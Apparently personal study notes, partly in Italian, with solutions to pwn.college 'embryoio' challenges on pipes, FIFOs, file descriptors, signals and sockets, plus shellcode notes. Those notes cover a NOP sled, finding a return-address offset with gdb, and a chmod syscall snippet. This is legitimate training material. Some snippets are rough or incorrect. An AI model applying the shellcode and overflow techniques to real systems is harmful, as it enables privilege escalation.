## Bash string concatenation
~~~sh
#!/bin/bash        
# str concatenation                 
str="a "           
for index in {0..45}
do                 
    str="${str}a " 
done               
str="${str}"lxckkspssc
                   
/challenge/embryoio_level68 $str
~~~

## pipe through two processes in C
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>

void pwncollege(){}

int main(){
    int fd[2];
    pipe(fd);

    pid_t cat = fork();

    if(cat == 0){
        dup2(fd[1],1);
        close(fd[0]);
        close(fd[1]);

        execlp("cat","cat",NULL);
    }
    
    pid_t p = fork();

    if(p == 0){
        dup2(fd[0],0);
        close(fd[0]);
        close(fd[1]);
        char* prog = "/challenge/embryoio_level64";

        execlp(prog,prog,NULL);
    }
    
    close(fd[0]);
    close(fd[1]);

    waitpid(p,NULL,0);
    waitpid(cat,NULL,0);

    exit(0);
}
```
## python pipe
~~~py
import subprocess; \
p1 = subprocess.Popen(["cat"], stdout=subprocess.PIPE); \
p2 = subprocess.run(["/challenge/embryoio_level52"],stdin=p1.stdout); \
p1.stdout.close();
~~~

## change current working directory CWD

```py
1 import subprocess
2 p1 = subprocess.Popen(["/challenge/embryoio_level79"],cwd="/tmp/jxnvtl")
3 p1.wait()    
```
```c
int main(){
    pid_t p = fork();

    if(p == 0){
        chdir("/tmp/akmfno"); // setting child cwd
        char *prog = "/challenge/embryoio_level85";
        execlp(prog,prog,NULL);
    }
    chdir("~"); // setting parent cwd
    wait(NULL);

    exit(0);
}
```

## Create FIFO
```sh
mkfifo <name>
```

## FIFO as input and output
- the challenge checks for a specific parent process : shellscript
- the challenge will make sure that stdin is redirected from a fifo
- the challenge will make sure that stdout is a redirected from fifo
- the challenge will check for a hardcoded password over stdin : tfsxnkub
- 
```sh
/challenge/embryoio_level92 < in_p
echo "tfsxnkub" > in_p | ./s.sh > out_p | cat out_p
```
- the challenge checks for a specific parent process : shellscript
- the challenge will make sure that stdin is redirected from a fifo
- the challenge will make sure that stdout is a redirected from fifo
- the challenge will force the parent process to solve a number of arithmetic problems : 1
- the challenge will use the following arithmetic operations in its arithmetic problems : +*
- the complexity (in terms of nested expressions) of the arithmetic problems : 1

```sh
/challenge/embryoio_level93 < in_p
cat > in_p | ./s.sh > out_p | cat out_p
cat > in_p | ./s.sh < in_p > out_p | cat > out_p
```

```sh
echo "asda" > in_p &
cat out_p &
/cha.. < in_p > out_p
```
69,75,76,77,81,90,93,106,107,108,116,117,,125,126

## Bash file descriptor
```sh
1 #!/bin/bash
2            
3 exec 303<> f303 # creating a file descriptor 303 from file f303 which has the password inside                 
4            
5 /challenge/embryoio_level94 <&303 # redirecting stdin from fd 303
6            
7 exec 303>&-   # closing fd 303
```
Task: 
- the challenge checks for a specific parent process : shellscript
- the challenge will take input on a specific file descriptor : 303
- the challenge will check for a hardcoded password over stdin : fjnvdylk

```sh
cat "asd" >&1
```

## Sending Signals

```sh
kill -SIGINT <pid> # sending signal int to pid
```

## Read and Send with pwntools
```py
  1 from pwn import *              
  2 context.log_level = 'debug'                          
  3 p = process(["b.sh"])          
  4 ch_str = "Please send the solution for: "
  5 line = p.recvuntil(b"[TEST] CHALLENGE!")
  6 while True:                    
  7     line = p.recv().decode()   
  8     print("my script: ",line)  
  9     if ch_str in line:         
 10         line = line.split(':')[1].strip()
 11         print(line)            
 12         res = eval(line)       
 13         tosend = f"{str(res)}\n"
 14         p.send(tosend.encode())
 15     if "flag" in line:         
 16         print(line)            
 17         break                  
 18                                
 19 p.interactive() 
```
### Alternative without pwntools
```py
import subprocess

p = subprocess.Popen("/challenge/embryoio_level100", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

while True:
    line = p.stdout.readline().decode()
    print(line)
    if "[TEST] CHALLENGE!" in line:
        data = line.split(":")[1]
        print(data)
        res = eval(data)
        print(res)
        tosend = f"{str(res)}\n"
        p.stdin.write(tosend.encode())
        p.stdin.flush()
    if line == "":
        break
```

## Links
```sh
ln -s /challenge/embryoio_level102 ywdkvt
export PATH=$PATH:.
```

## cal problema using socket and bash + python 140

```sh
1 #!/bin/bash   
2 exec 4<>/dev/tcp/localhost/1560
3  
4 while read -u 4 line
5 do
6     echo "$line"
7     if [[ $line == *"CHALLENGE! Please send the solution for:"* ]]
8     then
9         cmd=${line:48}
10         sol=$(python -c "print(${cmd})")
11         echo $sol >&4
12     fi
13 done
 ```

 ## AMS repeat directive .rept INSTRUCTIONS .endr

 ```s
 .intel_syntax noprefix
.global _start
.section .text

_start:
jmp JUMP
.rept 0x51 # number of repetitions 
nop
.endr # end rept block
JUMP:
mov rax,0x1
 ```

## Shellcode

```
# per ottenere il file binario da inviare al 
objcopy -O binary --only-section=.text <filename.binary> <filename.output>
objcopy --dump-section .text=<file.output> <file.input>
```

```
usa `-` per aprire l'input altrimenti si chiude subito se shellcode usa `execve`
cat sol - | /cha...

```

```
.skip 0x800, 0x90
```
### Trovare Return Address - secondo convenzioni
Come faccio trovare RA? so che la variabile `buf` è di 80 bytes (perché `char buf[80]`) e poi c'è la variabile `cookie` quindi altri 4 byte (int cookie 4 bytes) da cui devo arrivare all'indirizzo di ritorno `RA`. Io so che l'istruzione `ret` fa pop dallo stack l'indirizzo di memoria dove è allocato prossima l'istruzione. 
* Metodo semplice: 
  * riempio il buffer con 80 valori `A*80` e poi altri valori come `AAAABBBBCCCCDDDD` che ripetono 4 volte (perché quando visualizziamo ci fa vedere 4 byte alla volta che semplifica il conteggio)
  * controlliamo con un breakpoint (in gdb) all'istruzione `ret` cosa abbiamo in dentro il `rsp`. In questo modo posso calcolare quanti byte ci sono dal buffer al RA.
    * Per settare il breakpoint all'istruzione `ret` di `main` faccio `disas main` e `break main+<number>` nel mio caso `break *main+87`.

NOTE: per settare breakpoint ad un indirizzo preciso bisogna usare `*`. es. `break *main+87` dove `main` è un label, oppure `break *0x1234abcd` indirizzo diretto.

Per trovare l'indirizzo oppure l'offset fino all'istruzione `ret` uso `disas main` il quale disassebmla la funzione main.

![Disassemble main](assets/images/disas%20main.png)

## Baby Assembly

```s
.intel_syntax noprefix
.global _start
.section .text

# universal?
_start:

push 0x41
push rsp
pop rdi
mov al,90 # chmod
mov sil,44
syscall 
```

## Magic number
```py
int(0x80000000)
```

## Python
```py
import subprocess

p = subprocess.Popen("/challenge/embryoio_level100", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

while True:
    line = p.stdout.readline().decode()
    print(line)
    if "[TEST] CHALLENGE!" in line:
        data = line.split(":")[1]
        print(data)
        res = eval(data)
        print(res)
        tosend = f"{str(res)}\n"
        p.stdin.write(tosend.encode())
        p.stdin.flush()
    if line == "":
        break
```